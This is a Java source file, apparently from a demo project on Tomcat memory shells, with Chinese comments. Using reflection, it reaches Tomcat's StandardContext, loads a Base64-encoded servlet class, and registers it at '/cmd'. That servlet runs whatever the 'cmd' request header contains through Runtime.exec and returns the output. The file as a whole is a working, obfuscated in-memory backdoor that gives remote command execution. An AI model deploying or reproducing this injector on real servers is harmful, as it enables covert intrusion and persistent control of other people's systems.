package com.example.tomcatmemshell.demos.web.spel;

import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;

import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;



public class AddServlet2 {

    public static String SERVLET_CLASS_STRING = "yv66vgAAADcAbgoAEgBABwBBCAAxCwACAEIKAEMARAoAQwBFCgA2AEYHAEcHAEgKAAkASQoACABKCgAIAEsLADQATAoATQBOCgA2AE8HAFAHAFEHAFIHAFMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAQUxjb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkc2VydmxldC9NZW1zaGVsbFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAQZ2V0U2VydmxldENvbmZpZwEAHygpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzsBAAdzZXJ2aWNlAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAVAcAVQcAVgcAVwcAWAEACkV4Y2VwdGlvbnMHAFkHAFoBAA5nZXRTZXJ2bGV0SW5mbwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABRNZW1zaGVsbFNlcnZsZXQuamF2YQwAFAAVAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAWwBcBwBdDABeAF8MAGAAYQwAYgBjAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMABQAZAwAFABlDABmADwMAGcAaAcAaQwAagBrDABsAG0BAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BAD9jb20vZXhhbXBsZS90b21jYXRtZW1zaGVsbC9kZW1vcy93ZWIvYWRkc2VydmxldC9NZW1zaGVsbFNlcnZsZXQBABBqYXZhL2xhbmcvT2JqZWN0AQAVamF2YXgvc2VydmxldC9TZXJ2bGV0AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB3dhaXRGb3IBAAMoKUkAIQARABIAAQATAAAABgABABQAFQABABYAAAAvAAEAAQAAAAUqtwABsQAAAAIAFwAAAAYAAQAAAA8AGAAAAAwAAQAAAAUAGQAaAAAAAQAbABwAAQAWAAAANQAAAAIAAAABsQAAAAIAFwAAAAYAAQAAABEAGAAAABYAAgAAAAEAGQAaAAAAAAABAB0AHgABAAEAHwAgAAEAFgAAACwAAQABAAAAAgGwAAAAAgAXAAAABgABAAAAFAAYAAAADAABAAAAAgAZABoAAAABACEAIgACABYAAAFRAAUACgAAAFwrwAACTi0SA7kABAIAOgQZBMYASrgABRkEtgAGOgUZBbYABzoGuwAIWbsACVkZBrcACrcACzoHGQe2AAxZOgjGABEsuQANAQAZCLYADqf/6hkFtgAPV6cABToJsQABAFAAVgBZABAAAwAXAAAAMgAMAAAAGAAFABkADwAaABQAGwAeABwAJQAdADcAHwBCACAAUAAjAFYAJgBZACQAWwAoABgAAABcAAkAHgA9ACMAJAAFACUANgAlACYABgA3ACQAJwAoAAcAPwAcACkAKgAIAAAAXAAZABoAAAAAAFwAKwAsAAEAAABcAC0ALgACAAUAVwAvADAAAwAPAE0AMQAqAAQAMgAAAEEABP8ANwAIBwARBwAzBwA0BwACBwA1BwA2BwA3BwAIAAD8ABgHADVIBwAQ/wABAAUHABEHADMHADQHAAIHADUAAAA4AAAABgACADkAOgABADsAPAABABYAAAAsAAEAAQAAAAIBsAAAAAIAFwAAAAYAAQAAACsAGAAAAAwAAQAAAAIAGQAaAAAAAQA9ABUAAQAWAAAAKwAAAAEAAAABsQAAAAIAFwAAAAYAAQAAAC8AGAAAAAwAAQAAAAEAGQAaAAAAAQA+AAAAAgA/";
    public AddServlet2(){
        try {

            // 从线程中获取类加载器WebappClassLoaderBase
            TomcatEmbeddedWebappClassLoader contextClassLoader = (TomcatEmbeddedWebappClassLoader) Thread.currentThread().getContextClassLoader();
            // 获取TomcatEmbeddedContext对象
            WebResourceRoot resource = (WebResourceRoot) getField(contextClassLoader,Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources"));
            Context context=  resource.getContext();
            // 从上下文中获取ApplicationContext对象
            ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));

            // 从Application中获取StandardService对象
            StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));

            // 从StandardService中获取Connector数组
            Connector[] connectors = standardService.findConnectors();
            for (Connector connector : connectors) {
                if (connector.getScheme().toLowerCase().contains("http")) {
                    // 获取Connector对象的protocolHandler属性值
                    ProtocolHandler protocolHandler = connector.getProtocolHandler();
                    // 筛选我们需要的Abstract
                    if (protocolHandler instanceof AbstractProtocol) {
                        // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                        // 反射获取该方法
                        Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                        getHandler.setAccessible(true);
                        AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                        // 从上面获取的handler中取出global属性值
                        RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                        // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                        ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                        // 遍历List中的元素
                        for (Object processor : processors) {
                            RequestInfo requestInfo = (RequestInfo) processor;
                            // 获取对应的Request对象
                            org.apache.coyote.Request reqs = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) reqs.getNote(1);




                            String servletName = "su18Servlet";

                            // 从 request 中获取 servletContext
                            ServletContext servletContext = request.getServletContext();

                            // 如果已有此 servletName 的 Servlet，则不再重复添加
                            if (servletContext.getServletRegistration(servletName) == null) {

                                StandardContext o = null;

                                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                                while (o == null) {
                                    Field f = servletContext.getClass().getDeclaredField("context");
                                    f.setAccessible(true);
                                    Object object = f.get(servletContext);

                                    if (object instanceof ServletContext) {
                                        servletContext = (ServletContext) object;
                                    } else if (object instanceof StandardContext) {
                                        o = (StandardContext) object;
                                    }
                                }

                                // 创建自定义 Servlet
                                Class<?> servletClass = getClass(SERVLET_CLASS_STRING);

                                // 使用 Wrapper 封装 Servlet
                                Wrapper wrapper = o.createWrapper();
                                wrapper.setName(servletName);
                                wrapper.setLoadOnStartup(1);
                                wrapper.setServlet((Servlet) servletClass.newInstance());
                                wrapper.setServletClass(servletClass.getName());

                                // 向 children 中添加 wrapper
                                o.addChild(wrapper);

                                // 添加 servletMappings
                                o.addServletMappingDecoded("/cmd", servletName);

                            }
                        }
                    }
                }
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getField(Object obj, Field field){
        try{
            field.setAccessible(true);
            return field.get(obj);
        }catch (Exception e){

        }
        return null;
    }

    public static Class<?> getClass(String classCode) throws InvocationTargetException, IllegalAccessException {
        ClassLoader   loader        = Thread.currentThread().getContextClassLoader();
        byte[]        bytes         = Base64.getDecoder().decode(classCode);

        Method   method = null;
        Class<?> clz    = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;

    }
}
